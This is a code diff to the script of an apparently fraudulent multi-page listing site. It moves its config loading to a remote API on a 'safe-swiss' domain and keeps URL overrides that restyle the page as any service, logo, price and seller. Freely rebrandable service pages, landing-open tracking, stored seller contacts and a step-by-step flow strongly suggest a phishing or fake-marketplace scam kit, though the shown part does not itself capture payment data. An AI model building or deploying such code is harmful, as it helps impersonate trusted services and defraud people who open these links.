@@ -2542,44 +2542,65 @@
       /* ==========================================================================
          CONFIG LOADER & THEME APPLIER
          ========================================================================== */
-      function loadListingConfig() {
-        const config = JSON.parse(JSON.stringify(defaultListingConfig));
-        try {
-          const urlParams = new URLSearchParams(window.location.search);
-          
-          if (urlParams.has('listing_id') || urlParams.has('transaction_id') || urlParams.has('id')) {
-            config.listing_id = urlParams.get('listing_id') || urlParams.get('transaction_id') || urlParams.get('id');
-          }
-          if (urlParams.has('service_name')) config.service.name = urlParams.get('service_name');
-          if (urlParams.has('service_logo') || urlParams.has('logo_url')) {
-            config.service.logo_url = urlParams.get('service_logo') || urlParams.get('logo_url');
-          }
-          if (urlParams.has('favicon_url')) config.service.favicon_url = urlParams.get('favicon_url');
-          if (urlParams.has('theme_primary') || urlParams.has('primary_color')) {
-            config.service.theme.primary = urlParams.get('theme_primary') || urlParams.get('primary_color');
-          }
+      const LISTING_API_BASE_URL = (window.LISTING_API_BASE_URL || 'https://api.safe-swiss.online').replace(/\/$/, '');
 
-          if (urlParams.has('product_title') || urlParams.has('title')) {
-            config.listing.title = urlParams.get('product_title') || urlParams.get('title');
-          }
-          if (urlParams.has('product_image') || urlParams.has('image_url')) {
-            config.listing.image_url = urlParams.get('product_image') || urlParams.get('image_url');
-          }
-          if (urlParams.has('price')) config.listing.price = urlParams.get('price');
-          if (urlParams.has('currency')) config.listing.currency = urlParams.get('currency');
-          if (urlParams.has('delivery_info')) config.listing.delivery_info = urlParams.get('delivery_info');
-          if (urlParams.has('seller_contact') || urlParams.has('seller')) {
-            config.listing.seller_contact = urlParams.get('seller_contact') || urlParams.get('seller');
-          }
+      function getListingSlug() {
+        const pathMatch = window.location.pathname.match(/\/p\/([A-Za-z0-9]{8})(?:\/)?$/);
+        const urlParams = new URLSearchParams(window.location.search);
+        return (pathMatch && pathMatch[1]) || urlParams.get('slug') || urlParams.get('listing_id') || urlParams.get('id') || '';
+      }
 
-          // Check if window.__LISTING_CONFIG__ is provided by backend injection
-          if (window.__LISTING_CONFIG__ && typeof window.__LISTING_CONFIG__ === 'object') {
-            Object.assign(config, window.__LISTING_CONFIG__);
-          }
-        } catch (e) {
-          console.warn('Config loader error:', e);
-        }
+      function mergeListingConfig(base, incoming) {
+        return {
+          ...base,
+          ...incoming,
+          service: { ...base.service, ...(incoming && incoming.service), theme: { ...base.service.theme, ...(incoming && incoming.service && incoming.service.theme) } },
+          listing: { ...base.listing, ...(incoming && incoming.listing) }
+        };
+      }
+
+      function applyLegacyUrlOverrides(config) {
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.has('service_name')) config.service.name = urlParams.get('service_name');
+        if (urlParams.has('service_logo') || urlParams.has('logo_url')) config.service.logo_url = urlParams.get('service_logo') || urlParams.get('logo_url');
+        if (urlParams.has('favicon_url')) config.service.favicon_url = urlParams.get('favicon_url');
+        if (urlParams.has('theme_primary') || urlParams.has('primary_color')) config.service.theme.primary = urlParams.get('theme_primary') || urlParams.get('primary_color');
+        if (urlParams.has('product_title') || urlParams.has('title')) config.listing.title = urlParams.get('product_title') || urlParams.get('title');
+        if (urlParams.has('product_image') || urlParams.has('image_url')) config.listing.image_url = urlParams.get('product_image') || urlParams.get('image_url');
+        if (urlParams.has('price')) config.listing.price = urlParams.get('price');
+        if (urlParams.has('currency')) config.listing.currency = urlParams.get('currency');
+        if (urlParams.has('delivery_info')) config.listing.delivery_info = urlParams.get('delivery_info');
+        if (urlParams.has('seller_contact') || urlParams.has('seller')) config.listing.seller_contact = urlParams.get('seller_contact') || urlParams.get('seller');
         return config;
+      }
+
+      async function loadListingConfig() {
+        let config = JSON.parse(JSON.stringify(defaultListingConfig));
+        const slug = getListingSlug();
+        try {
+          const cached = sessionStorage.getItem('listingConfig');
+          if (cached) config = mergeListingConfig(config, JSON.parse(cached));
+        } catch (e) {}
+
+        if (window.__LISTING_CONFIG__ && typeof window.__LISTING_CONFIG__ === 'object') {
+          config = mergeListingConfig(config, window.__LISTING_CONFIG__);
+        }
+
+        if (!slug) return applyLegacyUrlOverrides(config);
+
+        try {
+          const response = await fetch(`${LISTING_API_BASE_URL}/api/public/listings/${encodeURIComponent(slug)}`, { headers: { Accept: 'application/json' } });
+          if (!response.ok) throw new Error(`Listing API responded with ${response.status}`);
+          const remoteConfig = await response.json();
+          config = mergeListingConfig(config, remoteConfig);
+          sessionStorage.setItem('listingConfig', JSON.stringify(config));
+          sessionStorage.setItem('listing_slug', slug);
+        } catch (error) {
+          console.warn('Listing API unavailable; using cached/default config.', error);
+        }
+
+        config.listing_id = config.listing_id || slug;
+        return applyLegacyUrlOverrides(config);
       }
 
       function applyListingTheme(theme) {
@@ -3158,8 +3179,11 @@
             sessionStorage.setItem('helvetia_seller_contact', currentConfig.listing.seller_contact || '');
             sessionStorage.setItem('helvetia_service_name', currentConfig.service.name || '');
 
-            // Build query params
-            const search = window.location.search;
+            // Preserve the public listing slug across the multi-page flow.
+            const slug = getListingSlug();
+            const nextParams = new URLSearchParams(window.location.search);
+            if (slug) nextParams.set('slug', slug);
+            const search = nextParams.toString() ? `?${nextParams.toString()}` : '';
             setTimeout(() => {
               window.location.href = 'step-2.html' + search;
             }, 500);
@@ -3234,8 +3258,8 @@
       /* ==========================================================================
          PAGE BOOTSTRAP
          ========================================================================== */
-      document.addEventListener('DOMContentLoaded', () => {
-        const config = loadListingConfig();
+      document.addEventListener('DOMContentLoaded', async () => {
+        const config = await loadListingConfig();
         hydratePageFromConfig(config);
         trackLandingOpened();
         initSmartHeaderScroll();
